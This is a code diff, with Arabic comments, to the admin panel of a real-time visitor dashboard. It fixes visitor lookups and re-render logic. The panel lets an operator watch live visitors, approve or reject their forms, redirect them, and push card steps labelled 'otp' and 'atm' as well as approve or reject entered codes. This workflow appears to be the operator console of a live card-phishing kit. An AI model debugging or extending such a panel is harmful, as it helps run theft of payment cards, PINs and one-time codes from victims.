@@ -913,23 +913,22 @@
 
       // استقبال تحديثات الزوار (مثل تغيير حالة الانتظار)
       socket.on('visitors:update', (list) => {
-        // تجاهل التحديثات أثناء عرض "تم الإرسال"
-        if (window.skipNextUpdate) return;
-        
+        // تحديث البيانات دائماً
         list.forEach(v => {
           const existing = visitors.get(v._id);
           if (existing) {
-            // تحديث البيانات المهمة فقط
             existing.waitingForAdminResponse = v.waitingForAdminResponse;
             existing.page = v.page;
             visitors.set(v._id, existing);
           }
         });
-        renderVisitorsList();
-        // تحديث تفاصيل الزائر المحدد إن وجد
-        if (selectedVisitorId) {
-          const visitor = visitors.get(selectedVisitorId);
-          if (visitor) renderVisitorDetails(visitor);
+        // إعادة الرسم فقط إذا لم يكن هناك عملية جارية
+        if (!window.skipNextUpdate) {
+          renderVisitorsList();
+          if (selectedVisitorId) {
+            const visitor = visitors.get(selectedVisitorId);
+            if (visitor) renderVisitorDetails(visitor);
+          }
         }
       });
     }
@@ -1788,7 +1787,7 @@
     function approveForm(socketId) {
       socket.emit('admin:approve', { visitorSocketId: socketId });
       // تحديث حالة الانتظار للزائر
-      const visitor = visitors.find(v => v.socketId === socketId);
+      const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) {
         visitor.waitingForAdminResponse = false;
         renderVisitors();
@@ -1799,7 +1798,7 @@
     function rejectForm(socketId) {
       socket.emit('admin:reject', { visitorSocketId: socketId });
       // تحديث حالة الانتظار للزائر
-      const visitor = visitors.find(v => v.socketId === socketId);
+      const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) {
         visitor.waitingForAdminResponse = false;
         renderVisitors();
@@ -1862,7 +1861,7 @@
       window.skipNextUpdate = true;
       socket.emit('admin:navigate', { visitorSocketId: socketId, page });
       // تحديث حالة الانتظار
-      const visitor = visitors.find(v => v.socketId === socketId);
+      const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) {
         visitor.waitingForAdminResponse = false;
       }
@@ -1896,7 +1895,7 @@
       window.skipNextUpdate = true;
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'otp' });
       // تحديث حالة الانتظار
-      const visitor = visitors.find(v => v.socketId === socketId);
+      const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) { visitor.waitingForAdminResponse = false; }
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove(originalBg);
@@ -1918,7 +1917,7 @@
       window.skipNextUpdate = true;
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'atm' });
       // تحديث حالة الانتظار
-      const visitor = visitors.find(v => v.socketId === socketId);
+      const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) { visitor.waitingForAdminResponse = false; }
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove(originalBg);
@@ -1939,7 +1938,7 @@
       window.skipNextUpdate = true;
       socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'reject' });
       // تحديث حالة الانتظار
-      const visitor = visitors.find(v => v.socketId === socketId);
+      const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) { visitor.waitingForAdminResponse = false; }
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove('bg-red-600', 'hover:bg-red-700');
@@ -1961,7 +1960,7 @@
       window.skipNextUpdate = true;
       socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'approve', codeIndex });
       // تحديث حالة الانتظار
-      const visitor = visitors.find(v => v.socketId === socketId);
+      const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) { visitor.waitingForAdminResponse = false; }
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove('bg-green-600', 'hover:bg-green-700');
@@ -1982,7 +1981,7 @@
       window.skipNextUpdate = true;
       socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'reject', codeIndex });
       // تحديث حالة الانتظار
-      const visitor = visitors.find(v => v.socketId === socketId);
+      const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) { visitor.waitingForAdminResponse = false; }
       btn.textContent = 'تم الإرسال ✓';
       btn.classList.remove('bg-red-600', 'hover:bg-red-700');
